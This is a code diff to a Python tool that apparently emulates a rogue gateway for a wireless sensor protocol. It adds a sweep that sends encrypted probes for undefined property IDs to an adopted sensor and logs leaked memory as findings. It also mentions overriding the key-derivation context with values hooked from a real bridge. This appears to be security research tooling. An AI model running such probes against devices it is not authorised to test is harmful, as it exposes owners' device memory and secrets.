@@ -54,10 +54,15 @@ class GatewaySession:
                  beacon_interval: float = 240.0,
                  kdf_context: bytes | None = None,
                  mgmt_counter_start: int = 0x7c,
-                 network_id: int = DEFAULT_NETWORK_ID):
+                 network_id: int = DEFAULT_NETWORK_ID,
+                 sweep=None):
         self.gw_mac = gw_mac
         self.pairing_key = pairing_key
         self.beacon_interval = beacon_interval
+        # Optional PROPERTY_REQUEST memory-disclosure sweep. When set, the
+        # gateway probes the adopted sensor on each 0x54 data-frame RX window.
+        self.sweep = sweep
+        self._sweep_tag = 0
         # keypair+0x30 context fed into the session-key KDF. Defaults to the
         # pairing_key; can be overridden to try values captured from a real
         # bridge (e.g. via tools/keyhook).
@@ -347,7 +352,93 @@ class GatewaySession:
                      counter, body.hex())
             return frame, tx_frame, dl_freq
 
+        # Sweep mode (post-adoption): capture any report, and use the sensor's
+        # data-frame RX window to send the next PROPERTY_REQUEST probe. Gated
+        # to 0x54 data frames so the adoption handshake above is never touched.
+        if self.sweep is not None:
+            self._ingest_app_report(frame.payload)
+            if frame.dctrl == 0x54 and 1 <= ul_channel <= 8:
+                body = self._next_probe_body()
+                if body is not None:
+                    from .hal import DL_FREQ_HZ
+                    dl_freq = DL_FREQ_HZ[ul_channel - 1]
+                    tx_frame = self._build_0x74_reply(frame.mac, body)
+                    log.info("SWEEP probe -> %s on %.1f MHz body=%s",
+                             format_mac(frame.mac), dl_freq / 1e6, body.hex())
+                    return frame, tx_frame, dl_freq
+                if self.sweep.done():
+                    log.info("SWEEP complete: %s", self.sweep.summary())
+
         return frame, None, 0
+
+    def _next_probe_body(self) -> bytes | None:
+        """Next application-layer probe body, or None if no sweep / exhausted.
+
+        Order: one DEVICE_INFO_REQUEST first (to map the surface and learn the
+        property value-size map), then PROPERTY_REQUEST batches until the id
+        queue drains.
+        """
+        if self.sweep is None:
+            return None
+        from . import appmsg
+        self._sweep_tag = (self._sweep_tag + 1) & 0xFF
+        # Send DEVICE_INFO_REQUEST until we've got a report back.
+        if self.sweep.device_info is None:
+            return appmsg.encode_device_info_request(tag=self._sweep_tag)
+        batch = self.sweep.next_batch()
+        if not batch:
+            return None
+        return appmsg.encode_property_request(batch, tag=self._sweep_tag)
+
+    def _build_0x74_reply(self, mac: bytes, body: bytes) -> bytes:
+        """Build an encrypted 0x74 DL frame carrying an app-message body.
+
+        Reuses the post-pairing seq/counter progression so probes continue the
+        same DL-data counter sequence the mgmt replies established.
+        """
+        self._post_pair_tx_seq_hi = getattr(self, "_post_pair_tx_seq_hi", 0) + 1
+        self._post_pair_tx_seq_lo = getattr(self, "_post_pair_tx_seq_lo", 0) + 1
+        self._post_pair_counter = getattr(self, "_post_pair_counter", -1) + 1
+        seq_hi = self._post_pair_tx_seq_hi & 0xFF
+        seq_lo = self._post_pair_tx_seq_lo & 0xFF
+        counter = self._post_pair_counter
+        header = bytes([0xE0, 0x74]) + mac + bytes([seq_hi, seq_lo])
+        mic = compute_mic(header, body)
+        return build_frame(0xE0, 0x74, mac, seq_hi, seq_lo, mic, body,
+                           self.session_key, counter=counter)
+
+    def _ingest_app_report(self, payload: bytes) -> None:
+        """Route a decrypted UL app message into the sweep controller."""
+        if self.sweep is None or not payload or len(payload) < 2:
+            return
+        from . import appmsg
+        msg_id = payload[0]
+        if msg_id == appmsg.MessageId.DEVICE_INFO_REPORT:
+            try:
+                report = appmsg.decode_message(payload)
+            except ValueError as exc:
+                log.warning("bad DEVICE_INFO_REPORT: %s", exc)
+                return
+            self.sweep.set_device_info(report)
+            log.info("SWEEP device_info: type=0x%04x fw=%s hw=%d "
+                     "anonId=%s supportedMsgs=%s supportedProps=%s",
+                     report["deviceType"], report["fwVersion"],
+                     report["hardwareRevision"],
+                     report["anonymousDeviceId"].hex(),
+                     report["supportedMessageIds"],
+                     [p["propertyId"] for p in report["supportedProperties"]])
+        elif msg_id == appmsg.MessageId.PROPERTY_REPORT:
+            try:
+                report = appmsg.decode_message(payload, sizes=self.sweep.sizes)
+            except ValueError as exc:
+                log.warning("bad PROPERTY_REPORT: %s", exc)
+                return
+            n_before = len(self.sweep.findings)
+            self.sweep.record_report(report)
+            for f in self.sweep.findings[n_before:]:
+                log.warning("SWEEP FINDING id=%d (%s) ch=%s value=%s reasons=%s",
+                            f["propertyId"], f["name"], f["channel"],
+                            f["value"].hex(), f["reasons"])
 
     def _handle_beaconing(self, frame: SuperLinkFrame, ul_channel: int = 0
                           ) -> tuple[SuperLinkFrame | None, bytes | None, int]:
@@ -569,6 +660,18 @@ def parse_gw_args(argv: list[str] | None = None) -> argparse.Namespace:
              "of 0x53/0x44/0x43 reply bodies). Default 0x7c matches pair4 "
              "real-bridge capture. Increments by 1 per reply.",
     )
+    parser.add_argument(
+        "--sweep", nargs="?", const="undefined", metavar="IDS",
+        help="Enable PROPERTY_REQUEST memory-disclosure sweep of the adopted "
+             "sensor. Optional IDS selects which property ids to probe: "
+             "'undefined' (default — 0,18,43-255, the payoff set), 'all' "
+             "(0-255), or an explicit list like '0,18,43-64'. Probes are sent "
+             "on 0x54 data-frame RX windows; adoption is untouched.",
+    )
+    parser.add_argument(
+        "--sweep-batch", type=int, default=8, metavar="N",
+        help="Property ids per PROPERTY_REQUEST probe (default 8).",
+    )
     return parser.parse_args(argv)
 
 
@@ -601,6 +704,18 @@ def main():
                   file=sys.stderr)
             sys.exit(1)
 
+    sweep = None
+    if args.sweep:
+        from .sweep import PropertySweep, parse_id_spec
+        try:
+            ids = parse_id_spec(args.sweep)
+        except ValueError as e:
+            print(f"Error: invalid --sweep IDS: {e}", file=sys.stderr)
+            sys.exit(1)
+        sweep = PropertySweep(ids=ids, batch_size=args.sweep_batch)
+        log.info("PROPERTY_REQUEST sweep enabled: %d ids, batch=%d",
+                 len(ids), args.sweep_batch)
+
     session = GatewaySession(
         gw_mac=gw_mac,
         pairing_key=bytes.fromhex(
@@ -609,6 +724,7 @@ def main():
         beacon_interval=args.beacon_interval,
         kdf_context=kdf_context,
         mgmt_counter_start=args.mgmt_counter_start,
+        sweep=sweep,
     )
 
     # CSV logging
